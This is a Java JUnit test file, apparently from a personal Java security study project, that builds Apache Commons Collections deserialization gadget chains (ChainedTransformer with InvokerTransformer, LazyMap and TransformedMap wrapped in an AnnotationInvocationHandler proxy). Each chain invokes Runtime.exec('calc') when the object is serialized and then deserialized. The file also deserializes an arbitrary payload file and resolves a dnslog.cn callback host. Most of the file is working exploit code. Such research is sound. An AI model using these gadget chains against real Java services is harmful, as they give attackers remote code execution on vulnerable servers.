package com.pinger.javasec;

import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.jupiter.api.Test;
import org.springframework.boot.system.JavaVersion;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/3/31 13:01
 */
public class BasicTest {


    @Test
    public void test1() throws Exception{
        String host="2usm73.dnslog.cn";
        InetAddress.getByName(host);
    }


    @Test
    public void test2() throws Exception{
        FileInputStream inputStream = new FileInputStream(new File("C:/payload1"));
        new ObjectInputStream(inputStream).readObject();
    }

    @Test
    public void test4() throws Exception{
        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        evalMap.put("test","test");
    }


    @Test
    public void test5(){
        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });
        HashMap<Object, Object> hashMap = new HashMap<>();

        // 测试一下lazyMap
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get("test");
    }

    @Test
    public void test6() throws Throwable {
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer(1)
        };

        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        HashMap<Object, Object> hashMap = new HashMap<>();

        // 获取lazyMap
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        // 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        // 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
        // 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
        // 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        // 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        // 最后再把真正的Transformer传入chainedTransformer
        Class<? extends ChainedTransformer> chainedTransformerClass = chainedTransformer.getClass();
        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,trueTransformer);
        // 序列化和反序化测试
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(res);
        new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())).readObject();
    }


    @Test
    public void test7() throws Exception{
        // 用P神的链打一下
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformer);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","test");
        Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);
        // 序列化和反序列化测试
        SerialUtil.runPayload(handler);
    }



    @Test
    public void test8() throws Exception{
        Class<TrAXFilter> clazz = TrAXFilter.class;
        clazz.getConstructor(new Class[]{Templates.class});
    }


    @Test
    public void testFiled() throws Exception{
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap1.put("p1n93r",1);
        hashMap2.put("p1n93s",6);
        int i = hashMap1.hashCode();
        int i1 = hashMap2.hashCode();
        System.out.println(i);
        System.out.println(i1);
    }




}
